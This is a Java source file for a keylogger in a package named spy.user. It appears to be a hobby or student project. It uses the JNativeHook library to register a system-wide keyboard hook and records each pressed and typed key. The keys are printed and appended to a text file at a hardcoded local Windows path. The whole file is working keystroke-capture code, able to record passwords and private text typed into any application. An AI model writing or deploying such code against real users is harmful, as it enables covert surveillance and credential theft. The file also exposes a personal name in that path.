/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package spy.user;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author root
 */
public class KeyLogger implements NativeKeyListener{
    
    public KeyLogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        String log=NativeKeyEvent.getKeyText(nke.getKeyCode());
        System.out.println(log);
        this.writefile((String)log);
        this.writefile("strong sdjdf sdfkasd asdkasd 1");
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        String log=NativeKeyEvent.getKeyText(nke.getKeyCode());
        System.out.println(log);
        this.writefile((String)log);
        this.writefile("strong sdjdf sdfkasd asdkasd ");
    }
    
    public void writefile(String cont){
      try {
 
            // Open given file in append mode by creating an
            // object of BufferedWriter class
            BufferedWriter out = new BufferedWriter(
                new FileWriter("C:/Users/Akshay Bahadarpure/Documents/NetBeansProjects/New folder/spy-user/src/log/keylog.txt", true));
 
            // Writing on output stream
            out.write(cont+" \n");
            // Closing the connection
            out.close();
        }
 
        // Catch block to handle the exceptions
        catch (IOException e) {
 
            // Display message when exception occurs
            System.out.println("exception occurred" + e);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
//        System.out.println(NativeKeyEvent.getKeyText(nke.getKeyCode()));
    }
    
}
